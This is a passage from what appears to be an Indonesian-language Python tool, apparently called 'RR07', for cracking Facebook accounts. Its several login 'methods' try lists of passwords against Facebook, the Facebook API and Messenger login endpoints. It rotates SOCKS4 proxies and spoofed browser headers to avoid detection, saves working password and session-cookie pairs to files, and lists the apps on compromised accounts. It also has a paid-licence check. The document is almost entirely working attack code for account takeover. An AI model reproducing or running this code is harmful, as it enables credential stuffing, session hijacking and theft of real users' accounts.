3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={Kue: cokz},headers=head,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}[{H2}OK{x}] : {H2}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{K2}CP{x}] : {K2}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------------------[ METODE-TOUCH-3 ]---------------------#
def rr073(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[{bo}RR07v3] | {P}{b}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1096408964130955&auth_token=46c61636e7c46590956dbdf2060b3ea3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&refsrc=deprecated&app_id=1096408964130955&cancel=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{x}[{K2}CP{x}] : {K2}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{x}[{H2}OK{x}] : {H2}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###-----[ METODE VALIDATE ]-----###
def _validate_(uid,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}>>> {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			hd = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}>>> {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}>>> {H}{kuki};{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}>>> {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE ASYNC ]-----###
def _async_(uid,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			versi = re.search('Chrome/(\d+).', str(ua)).group(1)
			versi2 = f".0.{str(rr(1111,5999))}.{str(rr(45,150))}"
			link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"pass": pw,"fb_dtsg":"","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			hd2 = {"Host": "m.facebook.com","content-length": "2138","sec-ch-ua": '"Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="%s"'%(versi),"sec-ch-ua-mobile": "?1","user-agent": ua,"viewport-width": "421","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"sec-ch-ua-platform-version": '"10.0.0"',"x-asbd-id": "129477","dpr": "2.56875","sec-ch-ua-full-version-list": '"Not/A)Brand";v="99.0.0.0", "Samsung Internet";v="23.0.0.47", "Chromium";v="%s%s"'%(versi,versi2),"sec-ch-ua-model": '"Redmi Note 7"',"sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ses.post("https://m.facebook.com/login/device-based/login/async/?api_key=190291501407&auth_token=563a4d0ad69493ce0947d19e95df8085&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&refsrc=deprecated&app_id=190291501407&cancel=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&lwv=100",data=data, headers=hd2, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki};{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE API ]-----###
def _api_(uid,pwv):
	global loop,ok,cp,a2f
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = api()
			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif 'Login approvals' in response.json()['error_msg']:
				a2f+=1
				print(f"\r{P}  - {M}{uid}|{pw} ---> A2F{P}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE MESSENGER ]-----###
def _messenger_(uid,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":uid,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pwv:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{P}  - {H}{kuki}{P}")
				ok +=1
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
#----------------------[ CEK-APLIKASI ]---------------------#
cka = 'cek_apk(session,cookie)'
def cek_apk(session,cookie):
	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
#----------------------[ LICENSE ]---------------------#
import requests
from datetime import datetime

LICENSE_FILE_PATH = "saved_license.txt"

def is_license_valid(license_info):
    # Split license_info into components
    license_key, start_time_str, end_time_str = license_info.split('|')

    # Convert string times to datetime objects
    start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')

    # Get current time
    current_time = datetime.now()

    # Check if the license is within the valid time range
    return start_time <= current_time <= end_time

def check_license(license_key):
    # Jika lisensi sudah tersimpan, gunakan langsung tanpa memerlukan input
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            if saved_license and is_license_valid(saved_license):
                return True
    except FileNotFoundError:
        pass

    # Jika lisensi tidak tersimpan atau tidak valid, lakukan verifikasi ulang
    github_repo_url = "https://raw.githubusercontent.com/khoirulez/RR07/main/mylisensi.txt"
    try:
        response = requests.get(github_repo_url)
        licenses = response.text.split('\n')

        for license_info in licenses:
            if license_info.startswith(license_key) and is_license_valid(license_info):
                # Simpan lisensi yang valid ke penyimpanan lokal
                with open(LICENSE_FILE_PATH, 'w') as file:
                    file.write(license_info)
                return True

        return False

    except requests.RequestException as e:
        print(f"Error: {e}")
        return False
def get_expiration_date(license_info):
    _, _, end_time_str = license_info.split('|')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')
    return end_time
def run():
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            banner()
            print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
            loading()
            clear()
            banner()
            print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
            saved_license = file.read()
            expiration_date = get_expiration_date(saved_license)
            print(f"[bold green]Lisensi kadaluwarsa pada tanggal: {B2}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
            if saved_license and is_license_valid(saved_license):
                time.sleep(0.03)
                print(f"[bold green]Lisensi valid. Selamat menggunakan program.")
                time.sleep(3)
                loading()
                clear()
                login_menu()
    except (IOError,FileNotFoundError):
       license_key = input(f"[{h}•{x}]{U}Masukkan lisensi{x}:{B} ")
       licen=open(".saved_license.txt", "w").write(license_key)
       time.sleep(0.03)

       if check_license(license_key):
          banner()
          print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
          loading()
          clear()
          banner()
          print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
          print(f"[bold green]Lisensi kadaluwarsa pada tanggal: {B2}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
          print(f"[bold green]Lisensi valid. Selamat menggunakan program.")
          time.sleep(3)
          loading()
          clear()
          login_menu()
       else:
          os.system("rm -f .saved_license.txt")
          print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.")
          time.sleep(0.03)
          run()
          

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/downloads/DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	pepek()
	




